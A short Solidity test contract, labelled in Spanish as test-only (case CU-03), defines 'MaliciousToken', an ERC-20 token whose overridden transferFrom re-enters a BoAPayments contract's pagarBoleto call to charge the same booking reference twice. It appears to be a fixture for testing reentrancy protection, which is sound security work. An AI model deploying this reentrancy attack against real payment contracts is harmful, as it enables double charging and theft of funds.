// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IBoAPayments {
    function pagarBoleto(string calldata pnr) external;
}

/**
 * @title MaliciousToken
 * @dev SOLO PARA PRUEBAS (CU-03). Token ERC-20 que, al ejecutarse transferFrom,
 * intenta reingresar a BoAPayments.pagarBoleto para cobrar el mismo PNR dos veces.
 */
contract MaliciousToken is ERC20 {
    address public objetivo;
    string public pnrAtaque;
    bool private atacando;

    constructor() ERC20("Malicious", "MAL") {
        _mint(msg.sender, 1_000_000 * 10 ** decimals());
    }

    function decimals() public pure override returns (uint8) {
        return 6;
    }

    function setupAttack(address _objetivo, string calldata _pnr) external {
        objetivo = _objetivo;
        pnrAtaque = _pnr;
    }

    function transferFrom(address from, address to, uint256 value) public override returns (bool) {
        if (objetivo != address(0) && !atacando) {
            atacando = true;
            IBoAPayments(objetivo).pagarBoleto(pnrAtaque); // reentrada
            atacando = false;
        }
        return super.transferFrom(from, to, value);
    }
}
